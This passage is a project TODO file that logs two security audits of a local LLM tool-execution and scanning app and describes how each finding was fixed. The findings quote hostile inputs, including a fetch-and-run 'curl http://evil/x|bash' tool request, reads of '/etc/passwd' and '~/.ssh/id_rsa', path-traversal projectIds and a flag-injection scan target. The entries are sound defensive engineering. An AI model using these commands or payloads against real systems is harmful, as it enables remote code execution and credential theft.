# TODO

All 11 tasks from the original build plan are done (see `DEVELOPMENT.md` for the full history).
This is the actionable list for what's next.

## Audit findings (2026-08-07)

Full-project audit (backend security, backend architecture/correctness, frontend correctness) -
three parallel reviews plus manual spot-checks, all findings below were verified by reading the
actual current code (or, for the path-traversal item, a pure computation with no filesystem
touched - no exploit was actually run against the live backend). Every finding across all three
severities has since been fixed, each in its own follow-up pass (High first, then all six Medium,
then all seven Low) - see each item's own note for what changed and DEVELOPMENT.md for the full
write-up of each pass. Only the Plugin system (see "Later" below) remains genuinely open.

### High

- [x] **`projectId` is never format-validated anywhere it reaches a filesystem path — real
      path-traversal / arbitrary file write & delete.** Fixed at the single chokepoint every
      project-scoped filesystem path actually funnels through:
      `services/projectStore.ts#projectDir(id)` now rejects anything that isn't UUID-shaped
      (`PROJECT_ID_PATTERN`, mirroring `agentManager.ts`'s existing `AGENT_ID_PATTERN` check)
      before ever building a path, throwing a new `InvalidProjectIdError` (400
      `INVALID_PROJECT_ID`). Every service (`toolManager.ts`, `orchestrator.ts`,
      `multiAgentOrchestrator.ts`, `findingsManager.ts`, `scanRunner.ts`, `reportManager.ts`) only
      ever reaches disk via `projectDir`/`readProjectJson`/`writeProjectJson`, or
      `projectManager.ts`'s own direct `projectDir()` calls - fixing it in that one place covers
      all of them without touching each individually, and can't be forgotten for a future one.
      `readProjectJson`/`projectManager.ts#readProjectMeta` were also restructured to resolve
      `projectDir(id)` *outside* their `catch { return [] / undefined }` blocks, so a rejected id
      surfaces as a real error instead of silently looking identical to "no data yet". 5 new
      regression tests in `projectManager.test.ts` (235 total) - malformed ids and literal
      `"../../../../tmp/pwn"`-style traversal attempts on `getProject`/`updateProject`/
      `deleteProject`/`readProjectJson`/`writeProjectJson`, asserting nothing was created on disk.
      Verified live against the real running backend (not just tests): the exact
      `projectId: "../../../../tmp/8rack-poc"` payload from the original audit now gets rejected
      with a clean 400 before any directory is created (confirmed via `ls` - no leaked directory
      anywhere), reproduced against `/api/orchestrator/tasks`, `/api/tools/request`, and
      `/api/projects/:id/scans`; a normal project (real UUID) still creates/round-trips correctly.
      See DEVELOPMENT.md's "Fixed: projectId path-traversal" section.

### Medium

- [x] Backend binds to all interfaces (`app.listen(env.port, ...)` in `index.ts` with no host
      argument defaults to `0.0.0.0`), not just localhost. Fixed: `env.host` (new, defaults to
      `127.0.0.1`, overridable via `HOST`) is now passed to `app.listen(env.port, env.host, ...)`.
      Verified live via `ss -ltnp` - the real running backend now shows `LISTEN 127.0.0.1:3001`,
      not `0.0.0.0:3001`; the frontend's Vite proxy (`localhost:3001`) still resolves and works
      correctly. `.env.example` documents the new `HOST` var and the tradeoff of changing it.
- [x] The workspace path-containment check (`toolManager.ts#isPathContained`/`looksLikePath`) is
      effectively theater for `bash -c "<script>"`/`python3 -c "<code>"`. Fixed: both tools'
      descriptions (`tools/exec/builtins.ts`) now say explicitly "NOT confined to the workspace
      root - the script string isn't checked for path containment... Review the exact resolved
      command before approving", and the module's own doc comment explains why. This is exactly
      what's shown in the Tool Registry and every Approve/Reject confirm card already, so the
      caveat reaches a reviewer at the point it matters without any new UI.
- [x] Chat sessions can opt into tool use mid-conversation but doing so silently starts a
      brand-new `OrchestratorTask` with no prior context. Fixed with the "explicit notice" option
      (not history-seeding - `useChat`'s messages and an `OrchestratorTask`'s are different shapes
      with no clean lossless conversion): `ChatSessionPanel.tsx` now shows an amber notice above
      `ChatTaskPanel` whenever the session has prior plain-chat messages, explicitly stating they
      aren't shown here and aren't seen by the agent, and how to see them again (switch Project
      back to "No project"). Turns out the prior messages weren't even still visible "above" as
      the original finding assumed - picking a project fully replaces the chat body with
      `ChatTaskPanel`, so this notice is the only place that fact was surfaced at all. 4 new
      frontend tests (`ChatSessionPanel.test.tsx`), verified live in-browser (sent a plain message,
      enabled tools, saw the exact notice with the correct count/agent name, switched back and
      confirmed the original messages were still there).
- [x] Concurrent writes to the same project's JSON history files can race. Fixed: a small
      per-`{projectId}:{filename}` write queue in `projectStore.ts` (`enqueueWrite`) serializes
      `writeProjectJson` calls so overlapping writes can never complete out of call order - a
      failed write doesn't wedge the queue (`.then(task, task)`, not just `.then(task)`), and
      different files for the same project don't needlessly block each other. 3 new tests proving
      out-of-order completion is prevented (a deliberately-delayed first write still lands before a
      second one is allowed to actually write), that a failed write doesn't block the next one, and
      that unrelated files stay independent.
- [x] Corrupted/truncated project JSON is silently treated as "no data" with zero logging. Fixed:
      `readProjectJson` (`projectStore.ts`) and `readProjectMeta` (`projectManager.ts`) now
      distinguish a missing file (silent, expected) from a file that exists but fails `JSON.parse`
      (`console.warn` naming the project id and filename, still returns the same graceful
      empty/undefined fallback). 2 new tests asserting the warning fires for invalid JSON and stays
      silent for a plain missing file.
- [x] Startup hydration ran after the HTTP port was already accepting connections with no
      `try/catch`, so a thrown error was an unhandled rejection that silently aborted the rest of
      startup. Fixed: the whole hydration body in `index.ts`'s `app.listen(...)` callback is now
      wrapped in try/catch with a clear `console.error` naming what may not have loaded, without
      crashing the process (none of the routes strictly depend on hydration completing - they just
      read from each service's in-memory state, which starts empty either way). The "gate requests
      behind a 503 until ready" half of the original suggestion was deliberately skipped as a
      bigger architectural change than this pass warranted. Verified live: server restarted
      cleanly, `/health` and the frontend proxy both still work.

      See DEVELOPMENT.md's "Fixed: the six Medium audit findings" section for all six.

### Low

- [x] No flag-injection guard on a scan's `target` (`scanRunner.ts#substituteTarget`). Fixed:
      `requireTarget` now rejects any target starting with `-` (new `InvalidScanTargetError`, 400
      `INVALID_REQUEST`), checked before either `previewScan` or `createScanRun` do anything else.
      2 new backend tests; verified live via curl (`POST /scans/preview` with target
      `-oG=/tmp/evil` → clean 400 with an explanatory message, nothing created).
- [x] Deleting an agent never pruned that agent's session entries in `hooks/useSessions.ts`. Fixed:
      new `pruneOrphanedSessions(validAgentIds)` (drops any session, including a closed-but-retained
      chat session, whose `agentId` isn't in the given set - manual/no-agent sessions are always
      kept), called from a new `App.tsx` effect whenever `agents` changes, gated on
      `!agentsLoading` so the transient empty list before the first fetch resolves can't wrongly
      prune everything on initial load. 3 new frontend tests.
- [x] Closing a chat/task session tab mid-request didn't cancel the in-flight fetch. Fixed: both
      `useChat.ts` and `useOrchestratorTask.ts` now have an unmount-cleanup effect
      (`return () => abortRef.current?.abort()`) - confirmed this actually matters (these hooks'
      owning panels really do unmount for real on close, not just get CSS-hidden like inactive
      tabs - see `hooks/useSessions.ts#closeSession`). 2 new tests (one per hook) proving the abort
      signal fires exactly on unmount, not before.
- [x] Confirmed dead code with zero live importers: ~~`extensions/reportGenerator.ts`~~,
      `extensions/retrievalRegistry.ts`, `extensions/pluginRegistry.ts`, and the types that exist
      only to support them (`types/plugin.ts` - `types/report.ts` no longer applies, see below).
      Different from `extensions/toolRegistry.ts`/`types/tool.ts`, which *are* wired into a live
      path (`ollama.ts` → `routes/chat.ts`) even though functionally inert (zero tools registered) -
      already documented as intentional. `extensions/reportGenerator.ts` is resolved: deleted
      outright (not wired up) when Report generation was built for real - see below and
      DEVELOPMENT.md's "Report generation" section. `retrievalRegistry.ts`/`pluginRegistry.ts`/
      `types/plugin.ts` are still the real "written once, never connected, never revisited"
      leftovers - either wire them up when the Plugin system (see "Later" below) actually gets
      built, or delete them now.
      **Resolved: deleted in commit a65fb26** (per the "Later" decision - not wired up; the Plugin
      system that would need them remains unbuilt, see below). CLAUDE.md/POLISH.md were updated to
      stay accurate.
- [x] Test coverage gaps: `services/ollama.ts` had no `.test.ts` at all despite being genuinely
      complex (the Ollama REST client + native tool-calling round trip). Fixed: new
      `ollama.test.ts`, 29 tests - NDJSON parsing/buffering (including a line deliberately split
      across two reads, and a final line with no trailing newline), every error mapping
      (`OllamaModelNotFoundError`/`OllamaConnectionError`/`RequestCancelledError`/
      `EmbeddingModelUnavailableError`/plain `OllamaRequestError`), `resolveOllamaTools`, and the
      full `streamChatWithTools` round trip (native `tool_calls`, the tag-noncompliant fallback
      parser, an unregistered-tool error result, the `MAX_TOOL_ROUNDS` cap actually stopping at 4).
      `services/projectStore.ts`'s own gap was already closed as a side effect of the projectId/
      write-queue/corrupted-JSON Medium-severity fixes earlier in this audit (`projectManager.test.ts`
      now exercises its real `readProjectJson`/`writeProjectJson`/`listProjectIds` via the shared
      `fakeFs` double, not a mocked-away `projectStore.js`).
- [x] `README.md`'s feature list predated the Findings Engine, CVE lookup, Security Scanners, and
      Report generation. Fixed: added all four to the Features list, plus the missing `HOST` and
      `NVD_API_KEY` rows in the Configuration table (both real gaps from earlier fixes in this
      audit that hadn't made it into the README at the time).
- [x] `CLAUDE.md`'s "Architecture" section was still the original Task-11 scaffold. Fixed: full
      rewrite of both directory trees (backend `src/`/`data/`, frontend `src/`) to reflect the
      current real structure, a new services-file reference table, and three new short prose
      sections a future session most needs oriented on fast - "Two tool-calling mechanisms" (native
      Ollama `tool_calls` vs. the Orchestrator's own plain-text convention - genuinely easy to
      conflate), "Projects" (the `projectId`/`projectStore.ts` convention nearly everything is keyed
      on, including a pointer to the path-traversal fix), and a correction to the stale "Agents"
      section's claim that `Agent.tools` "isn't read anywhere yet" (it, and `Agent.execTools`, both
      are). Deliberately keeps this file as a map with pointers, not a duplicate of
      `DEVELOPMENT.md`'s much more detailed per-feature sections.

### Already fixed during this audit (cheap, unambiguous doc-accuracy errors)

- [x] `DEVELOPMENT.md`/`TODO.md` claimed "231 total" backend tests after the Security scanners
      work landed - actual was 220 (a plain arithmetic slip, not a stale historical entry). Both
      corrected to 220.
- [x] `CLAUDE.md` said "There are no automated tests yet" - stale from before the very first test
      suite was added. Corrected to describe the real `npm test` setup on both sides.

## Audit findings (2026-08-08)

Full-project re-audit (backend security, backend architecture/correctness, frontend correctness) -
three parallel reviews plus manual verification of every High/Medium item against the actual
current code (which now includes the uncommitted Tasks 1-3 work: scope enforcement, Mission
Editor/Assets/Activity, agent tool allowlists, etc.). All findings below were confirmed by reading
the code; nothing was exploited against the live backend. Baseline sanity checks at the time:
backend `npm test` 328/328, frontend `npm test` 252/252, both typechecks clean, `oxlint` clean (5
pre-existing `only-export-components` warnings).

**Update (2026-08-17):** all 3 High items, 3 of 10 Medium items, and 1 Low item fixed in a follow-up
pass - each marked `[x]` below with what changed and how it was verified. Current baseline: backend
`npm test` 354/354 (including the code-review follow-up fixes below), frontend `npm test` 271/271,
both typechecks clean, `oxlint` down to 3
pre-existing `only-export-components` warnings (`OrchestratorTaskView.tsx` only -
`FindingsTimeline.tsx`'s 2 were incidentally fixed by an unrelated import-cycle cleanup, see the Low
items below). The rest (7 Medium, 18 Low) remain open findings.

**Update (2026-08-18):** the mission-scope-enforcement, outbound-HTTP-timeout, streamed-output/
concurrency-limit, deleteProject-ghost-records, and unbounded-task-transcript Medium items fixed too
- see each one's own entry below for the full write-up. Current baseline: backend `npm test`
395/395, frontend unchanged at 271/271, both typechecks clean. 2 Medium, 18 Low remain open.

A `/code-review` pass over that same diff caught 3 more issues in the just-shipped fixes, all
confirmed and fixed: (1) the `cancelTask` fix above closed the wide race but left a narrower one -
a cancel landing *while `requestExecution()` itself was still awaiting* (its own internal
`getProject()`/`persistExecutions()`) wasn't re-checked once it resolved, so `advance()` would
overwrite the "cancelled" status back to `waiting_confirmation`; now re-checked and the
just-created execution is rejected in that case too (1 new test). (2)/(3) two small cleanups in the
path-containment fix: `isPathContained` was re-resolving `realOrNearestPath(env.workspaceRoot)` via
a fresh `realpathSync` ancestor walk for every path-like argument instead of once per call (hoisted
out of the loop), and `looksLikePath`'s `~` branch was dead code since `validateArguments` already
rejects a `~`-prefixed argument before `looksLikePath` is ever called on it (removed).

### High

- [x] **No Host-header/Origin/CSRF defense on a no-auth tool-execution API - browser-triggerable
      RCE via DNS rebinding.** `backend/src/index.ts:40` (`cors({ origin: env.corsOrigin })`) only
      gates cross-origin *reads* in browsers; there is no Host-header allowlist, no Origin/Referer
      check, and no CSRF token anywhere in the request path. The app binds `127.0.0.1` by default
      (`env.ts:15`), but that does not stop DNS rebinding: a malicious page served from `evil.com`
      with a short-TTL record switching to `127.0.0.1` becomes *same-origin* to `evil.com:3001`, so
      its `fetch("http://evil.com:3001/...")` bypasses CORS entirely. The chain is fully
      unauthenticated and needs no valid project: `POST /api/tools/request`
      (`{"tool":"bash","arguments":["-c","curl http://evil/x|bash"]}`) then
      `POST /api/tools/executions/:id/confirm` = arbitrary command as the backend user. The
      `confirm` route never re-checks scope/enabled state/requester; the same applies to every other
      mutating endpoint (`/api/orchestrator/tasks`, `/api/projects/:id/scans` which auto-confirms
      steps, `/reject`, `/cancel`, agent create/update). A LAN peer or any host-local process is the
      documented tradeoff, but the *browser* vector is not covered by loopback binding. Fixed: new
      `backend/src/middleware/hostCheck.ts`, wired in before every route, checks the request's Host
      header against an allowlist (`localhost`/`127.0.0.1`/`[::1]:PORT` by default, computed once in
      `env.ts#allowedHosts`) - only enforced in the default loopback-only mode, since `HOST` set to
      anything else is already an informed opt-in to wider exposure this app has no auth to guess a
      safe LAN allowlist for. Override via new `ALLOWED_HOSTS` env var. `env.ts` now also throws at
      startup on `CORS_ORIGIN=*` instead of accepting it silently. 5 new backend tests
      (`hostCheck.test.ts`). Verified live against the real running backend: `Host: evil.com` → clean
      403 `HOST_NOT_ALLOWED`; `Host: localhost:3001`/`127.0.0.1:3001` (what Vite's
      `changeOrigin: true` proxy actually sends) → 200, frontend unaffected. A per-install bearer
      token / same-site check on mutating endpoints remains a further hardening step, not pursued
      this pass.
- [x] **`cancelTask`/`cancelPlan` don't abort an in-flight generation - a cancelled task can be
      silently resurrected and spawn a new tool execution after the user cancelled it.**
      `backend/src/services/orchestrator.ts:800-825` (`cancelTask` is synchronous and only mutates
      the in-memory object; it has no handle on the AbortController driving the still-running
      `advance`). The only signal `advance` ever sees is the *creating request's* client-disconnect
      signal (`streamUtils.ts`). If a cancel arrives from a different connection (second tab, curl,
      `cancelPlan`), or in the window between generation finishing and the disconnect being
      observed, `advance` keeps going: pushes the assistant message, parses a tool request, calls
      `requestExecution` and sets `status = "waiting_confirmation"` (`:550-633`) - resurrecting a
      terminal-`"cancelled"` task and queueing a real subprocess the user already decided against.
      The frontend's single-tab flow masks this by aborting its own stream first
      (`useOrchestratorTask.ts`), but the backend contract is not enforced. Fixed exactly as
      suggested: a new `advanceTask()` wrapper registers a per-task `AbortController` (keyed map,
      `runningTaskControllers`, same pattern as `toolManager.ts`'s `runningControllers`) around every
      top-level `advance()` call, combined via `AbortSignal.any([...])` with the caller's own
      disconnect signal so either one stops the loop; `cancelTask` now aborts that controller before
      anything else, and `advance()` also re-checks `signal?.aborted` immediately before
      `requestExecution` so a cancel landing in that exact race window can no longer create a new
      execution. `cancelPlan` gets the fix for free (it already delegates to `cancelTask`). 2 new
      backend tests proving the exact races described above no longer resurrect a task or spawn an
      execution. Verified live against the real running backend with a real local 27B model:
      cancelled a task mid-generation from a separate `curl` call, confirmed the task settled
      `cancelled` and zero executions were created for the project.
- [x] **Session wipe on a failed agents fetch.** `frontend/src/App.tsx:68-74` runs
      `sessions.pruneOrphanedSessions(new Set(agents.map((a) => a.id)))` gated only on
      `agentsLoading` - but `useAgents.ts:18-22` leaves `agents` as its initial `[]` when
      `fetchAgents` fails (only `error` is set, `loading` goes false). So if the *first* `GET
      /api/agents` fails (backend briefly down at startup, transient blip), this permanently removes
      every agent-keyed session from `sessionStorage` - including closed-and-retained chat sessions,
      which `useSessions.ts` says have no other eviction path. Silent, no undo; the message
      histories remain as orphaned `8rack:chat-history:*` keys but are unreachable. Fixed exactly as
      suggested: `if (agentsLoading || agentsError) return;` (`agentsError` was already destructured
      in `App.tsx`, just unused by this guard). 3 new `App.test.tsx` tests (new file - no prior
      App-level test coverage existed) covering the loading/error/success gating explicitly.

### Medium

- [x] **Workspace path-containment is lexical and bypassable** (`backend/src/services/toolManager.ts:141-168`).
      `isPathContained` does a pure `path.resolve(base, candidate)` + `path.relative` string check -
      no `realpath`, no `~` handling, no parsing of flag/value pairs, no visibility into shell/script
      strings. Verified bypasses: (1) `bash`/`python` script strings - `arguments: ["-c", "cat
      /etc/passwd"]` resolves *relative* to base (the embedded leading `/` is just a segment), so it
      passes containment even though the spawned shell reads anywhere - the code's own comment in
      `builtins.ts` acknowledges this, but the filesystem tools' "confined" claim is false too;
      (2) flag-value paths - `curl -o/tmp/x`, `curl --output-dir=...`, `git --git-dir=/etc` embed the
      absolute path inside a single argv element that resolves inside base; (3) bare `..` contains no
      `/` and isn't `.`, so `looksLikePath("..")` is false and it's never checked at all (`ls ..`
      lists the workspace parent); (4) symlinks planted inside the workspace are not `realpath`-ed,
      so `read_file`/`grep`/`find` can read anywhere through one. (Note: a literal `~/.ssh/id_rsa`
      argv element is *not* expanded by `cat`/`tee` - spawn passes it verbatim - so that particular
      sub-case fails with ENOENT rather than reading the file; `bash -c "cat ~/..."` and `git` do
      expand it.) Fixed exactly as suggested, all four parts: `isPathContained` now resolves both
      sides via a new `realOrNearestPath()` (real `fs.realpathSync`, falling back to the nearest
      existing ancestor's real path + the not-yet-created suffix for a `write_file` target that
      doesn't exist yet) before checking containment, closing the symlink bypass; `looksLikePath` now
      also flags bare `".."`; and `validateArguments` rejects any `~`-prefixed argument outright
      (resolving it as a literal path would be actively misleading, since `path.resolve` doesn't do
      shell tilde-expansion the way `bash`/`git` do). For the flag-value-embedded-path class that
      genuinely can't be caught by per-argv-token containment, `git`/`curl`/`http_request`'s tool
      descriptions (`tools/exec/builtins.ts`) now carry the same explicit "NOT fully confined" caveat
      `bash`/`python` already had. 3 new backend tests, including a real symlink planted in the
      workspace pointing at the backend root. Verified live against the real running backend:
      `~/.ssh/id_rsa`, bare `..`, and a real `/etc`-pointing symlink all now rejected with a clean
      400.
- [x] **Mission-scope enforcement is bypassable and silently skipped for unknowns.** Fixed, all
      five parts: `scopeMatcher.ts` now extracts IPv6 (bare and bracketed-in-URL, validated via
      `node:net`'s `isIPv6` rather than a hand-rolled regex) with a `canonicalizeIPv6()` normalizer
      so compressed/expanded/cased spellings of the same address compare equal, plus IPv6 CIDR
      matching (`ipv6ToBigInt` + a 128-bit `BigInt` mask, mirroring the existing IPv4 CIDR check);
      decimal/hex/octal IPv4 forms embedded in an actual `http(s)://` URL are covered for free since
      Node's WHATWG `URL` host parser already normalizes those (`http://2130706433/` ->
      `127.0.0.1`) - a bare schemeless alternate-form IP (as `curl 2130706433` accepts) is a
      deliberate non-fix: a blanket "any integer could be a decimal IP" heuristic would misfire on
      ordinary flag values (port numbers, thread counts, ...), so that case still falls through to
      "unknown" rather than gaining a dedicated parser. New `backend/src/services/toolManager.ts#checkExecutionScope`
      (extracted from the inline logic previously duplicated as it was added to `confirmExecution`
      too) now: treats "unknown" as blocking when a strict (non-empty) `scope` allowlist is
      configured, not just a warning; distinguishes "project not found"/"getProject threw" from "no
      scope configured" - both now attach a `scopeWarning` ("could not be checked") instead of
      silently skipping the check with no trace; and is called again in `confirmExecution` right
      before the tool actually runs, so a mission's scope edited (or the project deleted) in the
      window between request and confirm is re-checked at the last possible point, blocking the
      confirm if now out of scope. Also fixed: a `"domain:port"`/`"ip:port"` scope entry now matches
      by host only (`extractTargets` never carries a port through in the first place, so an entry
      that included one previously matched nothing). 15 new backend tests (`scopeMatcher.test.ts` +9,
      `toolManager.test.ts` +6 incl. a confirm-time-re-check race), 364 total, typecheck/oxlint clean.
      Verified live against the real running backend: a strict-scope project's `bash -c "echo hi"`
      (no identifiable target) now gets a clean 403 `OUT_OF_SCOPE` instead of silently running;
      `curl http://[::1]/` against that same project blocks with `offending: ["::1"]` (previously
      the exact bypass the finding named); a genuine in-scope `curl https://example.com` still runs;
      and a tool request against a nonexistent `projectId` now returns a `scopeWarning` explaining
      scope couldn't be checked, instead of silently skipping the check with no trace at all.
- [x] **Outbound HTTP has no timeout anywhere.** Fixed: three new bounded timeouts, all
      configurable (`NVD_REQUEST_TIMEOUT_MS`/`OLLAMA_REQUEST_TIMEOUT_MS`/`OLLAMA_CHAT_IDLE_TIMEOUT_MS`,
      `config/env.ts`). `cveLookup.ts#queryNvd` and `ollama.ts`'s quick non-generation calls
      (`listModels`/`embed`) now pass `AbortSignal.timeout(...)`, mapped to a clear
      `OllamaTimeoutError`/`CveLookupError` message distinct from "connection refused". `/api/chat`
      (`ollama.ts#streamChat`) deliberately does **not** get a fixed-duration timeout - a large local
      model can legitimately run well past any reasonable fixed bound (confirmed live: a real 27B
      model's model-load alone took 22s, total generation 32s). Instead it gets an *idle* timeout,
      mirroring the frontend's existing `IDLE_TIMEOUT_MS` pattern
      (`frontend/src/hooks/useChat.ts`) exactly: an `AbortController` armed for
      `ollamaChatIdleTimeoutMs` (default 5 min) and re-armed on every chunk actually received,
      combined with the caller's own cancellation signal via `AbortSignal.any` so either one stops
      the stream - a connection gone genuinely silent (wedged Ollama) times out, a slow-but-alive
      generation never does. This also resolves the sub-point about a hung `lookup_cves`
      pseudo-tool pinning an orchestrator task past its time cap forever - it now surfaces a timeout
      error within `NVD_REQUEST_TIMEOUT_MS` instead of hanging indefinitely. 12 new backend tests
      (`ollama.test.ts` +8 incl. a fake-timers idle-timeout-fires case and a fake-timers
      slow-but-alive-stream-is-not-killed case, `cveLookup.test.ts` +2), 372 total, typecheck/oxlint
      clean. Verified live against the real running backend + a real local 27B model: `/api/models`
      round-trips normally with the new bounded signal attached, and a real `/api/chat` call whose
      model-load alone took 22s completed normally without being killed by the idle timer.
- [x] **Streamed tool output is uncapped and there's no global execution concurrency limit.**
      Fixed, both halves. `toolExecutor.ts#appendOutput` now checks the per-stream `truncated` flag
      *before* calling `onOutput` (previously called unconditionally at the top, before the cap
      check) and stops firing it entirely once a stream is truncated - the live-streamed bytes are
      now bounded by the identical `maxOutputBytes` cap as the accumulated `stdout`/`stderr`, and
      the boundary-crossing chunk is dropped from both, not just from the accumulated string.
      Global concurrency: new `env.maxConcurrentExecutions` (`MAX_CONCURRENT_EXECUTIONS`, default 5)
      enforced in `toolManager.ts#runRecord` - the one real chokepoint every real OS process spawn
      already funnels through (manual requests, Orchestrator tasks, Scan Profiles alike), so a
      single check there covers all of them with no separate scan/task-level limiter needed.
      `runningControllers.size` (already tracking exactly "processes currently spawned") doubles as
      the live count with no new counter. Not a queue, by design: a confirm beyond the cap fails
      fast with a new `TooManyConcurrentExecutionsError` (429 `TOO_MANY_CONCURRENT_EXECUTIONS`)
      *before* anything is spent - the execution record is left untouched at
      `pending_confirmation`, so the human just confirms again once a slot frees up. 2 new backend
      tests (`toolExecutor.test.ts` +1 proving `onOutput` stops firing once truncated,
      `toolManager.test.ts` +1 spinning up `maxConcurrentExecutions` real long-running processes,
      confirming the next one over the cap is rejected untouched, then confirming it again
      succeeds once a slot frees). 374 total, typecheck/oxlint clean. Verified live against the
      real running backend: 6 concurrent `bash -c "sleep 5"` confirms → exactly 5 succeeded, 1 got a
      clean 429 with the execution still `pending_confirmation` (confirmed via `GET
      /api/tools/executions`), then confirming that same execution again after the others finished
      succeeded normally; separately, a `bash -c` emitting 3MB of output → the live-streamed NDJSON
      total and the final stored `result.stdout` were each independently capped at exactly 1,044,480
      bytes (`truncated: true`), not the full 3MB.
- [x] **Chat `options` forwarded unvalidated → local Ollama OOM.** `routes/chat.ts:48-51`,
      `routes/agents.ts:110`, `chatService.ts:47-53` cast `body.options` straight through to Ollama;
      a huge `num_ctx`/`num_predict` (or out-of-range temperature/top_p) makes the local Ollama
      allocate context RAM per request. Fixed: new `sanitizeChatOptions()`
      (`routes/chatValidation.ts`) replaces the raw cast in both routes - only the four known
      `ChatOptions` fields survive, each clamped into a safe range (`temperature` 0-2, `top_p` 0-1,
      `num_predict`/`num_ctx` ≤ 131072, preserving Ollama's `-1`/`-2` `num_predict` sentinels),
      anything else (unknown keys, wrong types, `NaN`/`Infinity`) silently dropped rather than
      rejecting the whole request - these are resource knobs, not worth a hard 400 over. 15 new
      backend tests. Verified live: a request with `num_ctx: 999999999` no longer reaches Ollama
      unclamped; a normal in-range request round-trips unchanged.
- [x] **`Sheet` is a modal with no focus management** - `frontend/src/components/ui/Sheet.tsx:18-44`:
      no `role="dialog"`/`aria-modal`, no focus trap (Tab reaches background content), no Escape-to-
      close, no focus move-in/restore. Affects five surfaces: `SettingsPanel.tsx:25`,
      `AgentEditor.tsx:166`, `MissionEditor.tsx:136`, `FindingDetails.tsx:168`, `ReportsPanel.tsx:86`.
      Fixed exactly as suggested, all five surfaces at once via the shared component: `role="dialog"
      aria-modal="true"`, focus moves to the first focusable element on open (`requestAnimationFrame`-
      deferred so framer-motion has mounted children first), Tab is trapped inside the panel (wraps at
      both edges instead of reaching background content), Escape closes it, and focus restores to
      whatever opened it on close. 5 new tests (`Sheet.test.tsx`, new file). Verified live in-browser:
      Escape closed the Findings details drawer cleanly with no regression across all 5 consuming
      surfaces (full frontend suite green).
- [x] **`deleteProject` leaves all in-memory state intact; ghost records persist and can be
      re-hydrated.** Fixed via the "purge on delete" option: new `projectManager.ts#onProjectDeleted`
      callback registry - each of the six project-scoped services (`toolManager.ts`,
      `orchestrator.ts`, `findingsManager.ts`, `scanRunner.ts`, `reportManager.ts`,
      `multiAgentOrchestrator.ts`) registers a handler at its own module load time that purges that
      store's `Map` entries for the deleted project id; `deleteProject` calls every registered
      handler (each wrapped in its own try/catch so one failing can't block the others or the delete
      itself) right after removing the directory. A callback registry rather than
      `projectManager.ts` importing each service directly, since those services already import
      `getProject`/etc. from it - a reverse import would be circular. `toolManager.ts`'s handler also
      aborts a still-*running* execution's real subprocess (not just removing the stale Map entry) so
      it can't outlive the project it belonged to; `orchestrator.ts`'s does the same for a
      still-running task's generation. 13 new backend tests (`projectManager.test.ts` +3 for the
      registry mechanism itself - a handler is called with the right id, one handler throwing
      doesn't block the others or the delete, handlers aren't called when deletion itself fails;
      `toolManager.test.ts` +4 and `orchestrator.test.ts` +3 for the actual purge behavior -
      including a still-running execution/task genuinely getting aborted, not just delisted). 391
      total, typecheck/oxlint clean. Verified live against the real running backend: deleted a
      project mid-execution of a real `sleep 10` subprocess - `ps` confirmed the process was
      actually killed, and `GET /api/tools/executions` immediately returned `[]` instead of the
      stale record; a clean delete (nothing in flight) leaves the project directory gone entirely,
      no residue. **One residual, deliberately-accepted gap found via that same live test**: the
      in-flight case's own `persistExecutions()` call (already in progress when the abort lands)
      still fires afterward and recreates an *empty* orphan directory via `writeProjectJson`'s
      `mkdir(recursive)` - confirmed harmless (the write re-derives from the already-purged Map, so
      it persists `[]`, not the stale record; `GET /api/projects` correctly omits it since it has no
      `project.json`; a restart's hydration reads the same empty array). Closing this fully would
      mean the alternative suggested fix - gating every project-scoped write on project existence -
      an extra fs check on every write across all six services to prevent a cosmetic empty
      directory, not a real data leak; left as a known, narrow, low-value edge case rather than
      pursued.
- [x] **Task transcripts grow unboundedly and embed full (1MB each) tool output.** Fixed:
      `orchestrator.ts#resumeTask` (the sole place a tool result gets embedded into `task.messages`)
      now truncates `stdout`/`stderr` to 4000 bytes each (`truncateForTranscript`, UTF-8-byte-boundary-
      safe, appends a "...[truncated, showing N of M bytes]" note) and `parsedOutput` shape-aware
      (`truncateParsedOutputForTranscript`): an array (the common case - subfinder/httpx/etc, easily
      thousands of entries) capped to 200 items plus a truncation-note entry; a string capped the
      same way as stdout; any other JSON-serializable shape (an object, from the "json" parser) falls
      back to a byte-capped serialized string if it's actually over the limit. Deliberately did not
      add a separate cap on `task.messages` *count* - `env.maxOrchestratorToolCalls` (default 10)
      already bounds how many tool-result messages one task can ever accumulate, so per-message
      truncation is what actually bounds total transcript size (worst case now ~10 x a few KB instead
      of ~10 x 2MB). A completely different concern from `toolExecutor.ts`'s own
      `DEFAULT_MAX_OUTPUT_BYTES` (1MB per stream) - that bounds one execution's own memory/streamed
      output and is untouched; this bounds what gets resent to the model on every subsequent
      `advance()` call and persisted to `orchestrator-tasks.json` forever. 5 new backend tests
      (large stdout/stderr truncated with the byte count correct, small ones left untouched, a
      500-item array capped to 200 + a note, an oversized object falling back to a truncated
      string). 395 total, typecheck/oxlint clean. Verified live against the real running backend
      with a real local model: asked General Assistant to run `bash -c "head -c 20000 /dev/zero |
      tr '\0' 'a'"` - the real `ExecutionRecord.result.stdout` correctly held the full 20,000 bytes
      (toolExecutor's own cap, untouched), while both the task's in-memory transcript and the
      persisted `orchestrator-tasks.json` on disk correctly held only 4,044 bytes (4000 truncated +
      the marker text) for that same tool result.
- [x] **Project-scoped data hooks can land stale responses after a quick project switch.**
      `frontend/src/hooks/useTools.ts:13-28`, `useFindings.ts:12-27`, `useActivity.ts:16-34`,
      `useReports.ts:16-31`, `useScans.ts:29-44` - pre-nav-simplification layout; these now guard at
      resolution time with a `missionIdRef` comparison + request abort (the `useChat`/
      `useOrchestratorTask` pattern) and cover the mutation-settlement paths too. See POLISH.md A1.
      (2026-09-20)
- [x] **`ProjectPanel.disabled` (the documented mid-task lock) is never wired in the Workbench.**
      Pre-nav-simplification; post-rename the prop (now `MissionPanel`) is fully implemented and IS
      wired: `WorkOrdersView` passes `disabled={hasActiveTask}` (running/waiting_approval), and the
      card click/keyboard handlers also guard on `disabled`. See POLISH.md A2. (2026-09-20)

### Low

- [x] `assertNotPrivileged` is case-sensitive (`backend/src/services/toolManager.ts:177`) -
      `/\b(sudo|doas|pkexec|su)\b/` misses `Sudo`/`SUDO`; with no TTY most sudo installs still fail,
      so this is belt-and-suspenders. Now case-insensitive (`/i`) and also rejects `setsid` (escapes
      the A4 process-group kill); env-wrapped escalations are caught by the verb match, bare `env`
      stays allowed. See POLISH.md A6. (2026-09-20)
- [x] Cancel/timeout kills the direct child, not the process group (`backend/src/services/toolExecutor.ts:75-77`) -
      no `detached:true` + `kill(-pid)`. Now `detached:true` + `process.kill(-pid, SIGTERM)` on
